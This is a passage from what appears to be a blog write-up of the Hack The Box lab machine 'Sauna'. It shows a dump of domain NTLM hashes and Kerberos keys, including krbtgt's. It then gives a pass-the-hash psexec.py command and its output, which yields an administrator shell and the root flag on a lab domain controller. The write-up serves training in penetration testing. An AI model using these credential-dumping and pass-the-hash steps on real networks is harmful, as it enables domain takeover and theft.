+<span class="code-line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::</span>
+<span class="code-line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="code-line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::</span>
+<span class="code-line">SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::</span>
+<span class="code-line">[*] Kerberos keys grabbed</span>
+<span class="code-line">Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031</span>
+<span class="code-line">Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0</span>
+<span class="code-line">Administrator:des-cbc-md5:19d5f15d689b1ce5</span>
+<span class="code-line">krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24</span>
+<span class="code-line">krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9</span>
+<span class="code-line">krbtgt:des-cbc-md5:c170d5dc3edfc1d9</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c</span>
+<span class="code-line">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2</span>
+<span class="code-line">SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a</span>
+<span class="code-line">SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198</span>
+<span class="code-line">SAUNA$:des-cbc-md5:b989ecc101ae4ca1</span>
+<span class="code-line">[*] Cleaning up...</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="pth">PTH</h2>
+<p>We can then use the <a href="http://blog.gentilkiwi.com/tag/pass-the-hash">Path the hash</a>
+technique with
+<a href="https://github.com/SecureAuthCorp/impacket/">impacket's psexec.py</a> to login as
+Administrator on the Domain Controller as administrator and get the flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python psexec.py egotisticalbank.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Requesting shares on 10.10.10.175.....</span>
+<span class="code-line">[*] Found writable share ADMIN$</span>
+<span class="code-line">[*] Uploading file NEOSMAXA.exe</span>
+<span class="code-line">[*] Opening SVCManager on 10.10.10.175.....</span>
+<span class="code-line">[*] Creating service RFiq on 10.10.10.175.....</span>
+<span class="code-line">[*] Starting service RFiq.....</span>
+<span class="code-line">[!] Press help for extra shell commands</span>
+<span class="code-line">Microsoft Windows [Version 10.0.17763.973]</span>
+<span class="code-line">(c) 2018 Microsoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="code-line">f3ee04965c68257382e31502cc5e881f</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box is a lot like <a href="todo link if article already published">Forest</a> and I
+am a bit disappointed. Apart from that the box is interesting.</p>
+<blockquote>
+<p>What a journey. This box was classified as easy but probably needed a medium
+classification. WinRM is so <em>finicky</em>. The root part was interesting as it
+allowed us to play with AD privileges which doesn't happen a lot
+outside of client environments.</p>
+</blockquote>
+<p>(Conclustion of <a href="https://maggick.fr/2020/03/htb-forest.html">Forest</a>)</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/07/htb-book.html"> HTB: Book </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/07/htb-cascade.html"> HTB: Cascade </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
